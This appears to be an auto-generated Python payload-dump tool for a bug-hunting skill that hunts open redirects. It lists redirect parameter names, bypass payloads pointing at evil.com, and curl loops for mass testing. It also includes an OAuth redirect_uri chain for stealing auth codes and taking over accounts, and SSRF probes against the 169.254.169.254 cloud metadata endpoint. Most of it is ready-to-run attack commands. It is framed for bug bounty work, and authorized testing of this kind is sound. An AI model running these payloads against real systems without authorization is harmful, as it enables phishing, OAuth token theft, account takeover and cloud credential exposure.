#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-open-redirect

Skill: HUNT-OPEN-REDIRECT — Open Redirect
Desc : Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.

Run:  python claude-bughunter-hunt-open-redirect.py --help
      python claude-bughunter-hunt-open-redirect.py --list
      python claude-bughunter-hunt-open-redirect.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-open-redirect'
TITLE = 'HUNT-OPEN-REDIRECT — Open Redirect'
DESCRIPTION = 'Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.'

PAYLOADS = {
    'main': ["name: hunt-open-redirect", "description: Hunt Open Redirect \u2014 all types including low-impact, chained to OAuth token theft \u2192 ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.", "sources: hackerone_public", "report_count: 28"],
    'hunt-open-redirect-open-redirect': [],
    'crown-jewel-targets': ["Open redirect alone is Low. Chained to OAuth = Critical (ATO).", "**Highest-value chains:**", "- **Open redirect \u2192 OAuth auth code theft** \u2014 redirect_uri contains open redirect on trusted domain \u2192 auth code sent to attacker \u2192 ATO", "- **Open redirect \u2192 phishing** \u2014 users trust the URL because it starts with target.com", "- **Open redirect \u2192 SSRF escalation** \u2014 if redirect followed server-side \u2192 SSRF", "- **Open redirect \u2192 session fixation** \u2014 force user to login endpoint with pre-set session"],
    'attack-surface-signals': ["?redirect=", "?next=", "?url=", "?return=", "?returnTo=", "?continue=", "?dest=", "?destination=", "?forward=", "?location=", "?target=", "?redir=", "?redirect_uri=", "?callback=", "?checkout_url=", "?success_url=", "?cancel_url=", "/logout?returnTo=", "/login?next=", "/sso?callback="],
    'bypass-table': [],
    'step-by-step-hunting-methodology': [],
    'phase-1-discover-redirect-parameters': ["```bash"],
    'extract-all-redirect-candidates-from-crawl': ["cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt", "wc -l recon/$TARGET/redirect-candidates.txt"],
    'less-common-param-names': ["grep -E \"(\\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)\" \\", "recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt"],
    'phase-2-basic-test': ["```bash", "COLLAB=\"https://evil.com\"", "cat recon/$TARGET/redirect-candidates.txt | qsreplace \"$COLLAB\" | while read url; do", "LOC=$(curl -s -I --max-redirs 0 \"$url\" | grep -i \"^location:\")", "STATUS=$(curl -s -o /dev/null -w \"%{http_code}\" --max-redirs 0 \"$url\")", "[ -n \"$LOC\" ] && echo \"$STATUS | $LOC | $url\""],
    'phase-3-bypass-techniques': ["```bash", "BASE_URL=\"https://$TARGET/redirect?url=\"", "PAYLOADS=(", "\"https://evil.com\"", "\"//evil.com\"", "\"/\\\\evil.com\"", "\"https://$TARGET@evil.com\"", "\"https://evil.com%23.$TARGET\"", "\"https://evil.com%09\"", "for P in \"${PAYLOADS[@]}\"; do", "LOC=$(curl -s -I --max-redirs 0 \"${BASE_URL}${P}\" | grep -i \"^location:\")", "echo \"$P \u2192 $LOC\""],
    'phase-4-oauth-chain-test': ["```bash"],
    'if-target-has-oauth-check-if-redirect-uri-accepts-open-redirect': ["grep -i \"oauth\\|authorize\\|redirect_uri\" recon/$TARGET/urls.txt | head -20"],
    'construct-oauth-url-with-open-redirect-as-redirect-uri': [],
    'normal-redirect-uri-https-target-com-callback': [],
    'attack-redirect-uri-https-target-com-redirect-url-https-evil-com': ["OAUTH_URL=\"https://$TARGET/oauth/authorize\"", "curl -sv \"$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com\" 2>&1 | grep -i \"location:\""],
    'phase-5-server-side-redirect-ssrf-escalation': ["```bash"],
    'if-the-app-fetches-the-redirect-target-server-side-302-fetch-follow': ["curl -s \"https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/\""],
    'or-if-app-makes-http-request-to-the-redirect-destination': ["curl -s \"https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/\" \\", "-H \"Cookie: $SESSION\""],
    'automation': ["```bash"],
    'openredirex': ["pip3 install openredirex", "openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com"],
    'nuclei': ["nuclei -u https://$TARGET -t redirect/ -severity medium,high"],
    'gf-qsreplace': ["cat recon/$TARGET/urls.txt | gf redirect | qsreplace \"https://evil.com\" | \\", "xargs -I{} curl -s -o /dev/null -w \"%{http_code} %{redirect_url}\\n\" --max-redirs 0 {}"],
    'chain-table': [],
    'validation': ["\u2705 Location header in response points to evil.com (your controlled domain)", "\u2705 Browser follows redirect to attacker-controlled page", "**Severity:**", "- Redirect alone: Low (most programs)", "- Chains to OAuth code theft \u2192 ATO: High/Critical", "- Chains to phishing with brand name: Low-Medium", "- Server-side \u2192 SSRF: High"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()